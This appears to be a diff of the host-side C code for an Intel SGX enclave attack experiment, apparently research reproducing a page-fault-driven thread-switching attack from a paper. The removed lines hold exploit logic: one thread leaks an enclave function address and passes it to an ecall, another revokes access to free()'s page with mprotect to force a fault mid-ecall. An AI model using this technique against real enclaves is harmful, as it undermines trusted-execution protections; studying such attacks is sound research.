@@ -230,75 +230,6 @@ void attacker_config_runtime(void)
 }
 
 
-// Function for thread A
-void* thread_A(void* arg) {
-
-    printf("threadA running\n");
-
-    // locking for turn, sync logic, thread A sleeps until thread B does a page fault
-    pthread_mutex_lock(&lock);
-    while (turn != 0) { // Wait until it's thread_A's turn
-        pthread_cond_wait(&cond, &lock);
-    }
-    pthread_mutex_unlock(&lock);
-
-
-
-    sgx_enclave_id_t eidarg = *(sgx_enclave_id_t*)arg;
-
-    // Get the address of the succes() function in encl.c, we will use this address as str arg to ecall (exploit)
-    void* spt;
-    ecall_get_succes_adrs(eidarg, &spt);  // Get address of succes(), written to spt
-    //uint64_t address = (uint64_t) spt;
-
-    // !!! Dont just do str = spt with some cast, because then page fault (because spt is address in trusted memory?)
-    //char str[sizeof(uint64_t)];
-    // Copy address into str 
-    //memcpy(str, &address, sizeof(uint64_t));
-
-    printf("succes() address: %p\n", (uint64_t) spt);
-    //printf("input string %p\n", str);
-
-    printf("threadA entering enclave\n");
-    ecall_print_and_save_arg_once(eidarg, (uint64_t) &spt); // Enter enclave 
-    printf("threadA finished");
-}
-
-// Function for thread B
-void* thread_B(void* arg) {
-
-    sgx_enclave_id_t eidarg = *(sgx_enclave_id_t*)arg;
-    char* str = "japers";
-    printf("threadB running\n");
-
-   
-
-    //code to get the address and page of the free() function, which permissions we will revoke like in the example in the paper
-    void *free_addr = (void *)free;  // Get address of free()
-    // Align address to page size
-    void *free_page_start = (void *)((size_t)free_addr & ~(4096 - 1));
-    if (mprotect(free_page_start, 4096, PROT_NONE) != 0) {
-        perror("mprotect failed");
-    }else{
-        printf("access rights revoked on free\n");
-    }
-    
-    // this ecall will page fault when test_dummy is reached, free() is done, so then pf handler will change thread to thread A
-
-    // revoke execute permission on test_dummy()
-
-    /*void *test_dummy_page_start = (void *)((size_t)td_pt & ~(4096 - 1));
-     if (mprotect(test_dummy_page_start, 4096, PROT_NONE) != 0) {
-        perror("mprotect failed");
-    }else{
-        printf("access rights revoked on test_dummy\n");
-    }
-    // this ecall will page fault when test_dummy is reached, free() is done, so then pf handler will change thread to thread A
-    */
-   
-    ecall_print_and_save_arg_once(eidarg, (uint64_t) str);
-
-}
 
 
 
@@ -313,38 +244,26 @@ int main( int argc, char **argv )
     //ecall_test_malloc_free(eid);
 
     // Dry Run 
-    ecall_setup(eid);
+
+    ecall_checker_thread(eid);
+    ecall_writer_thread(eid);
+    ecall_checker_thread(eid);
+
+    void *memcpy_addr = (void *)memcpy;
+    void *strncmp_addr = (void *)strncmp;
+
+    printf("memcpy address: %p\n", memcpy_addr);
+    printf("strncmp address: %p\n", strncmp_addr);
 
 
-    char* str = "dryrun";
-    ecall_print_and_save_arg_once(eid, (uint64_t) str);
 
     // Do setup again
-    ecall_setup(eid);
     /* 1. Setup attack execution environment. */
     attacker_config_runtime();
 
     // get the address of test_dummy function, written to td_pt
     //ecall_get_test_dummy_adrs(eid, &td_pt);
 
-
-    //code to get the address and page of the free() and test_dummy functions, which permissions we will revoke like in the example in the paper
-    void *free_addr = (void *)free;  // Get address of free()
-    // Align address to page size
-    void *free_page_start = (void *)((size_t)free_addr & ~(4096 - 1));
-    printf("free() address: %p, page start: %p\n", free_addr, free_page_start);
-
-    //void *test_dummy_page_start = (void *)((size_t)td_pt & ~(4096 - 1));
-    //printf("test_dummy() address: %p, page start: %p\n", td_pt, test_dummy_page_start);
-    
-
-    // Create 2 threads
-    pthread_t t1, t2;
-    pthread_create(&t1, NULL, thread_A, (void*)&eid);
-    pthread_create(&t2, NULL, thread_B, (void*)&eid);
-
-    pthread_join(t1, NULL);
-    //pthread_join(t2, NULL); //-> dont wait on thread B to finish because it does not
 
     info_event("destroying SGX enclave");
     //SGX_ASSERT( sgx_destroy_enclave( eid ) );
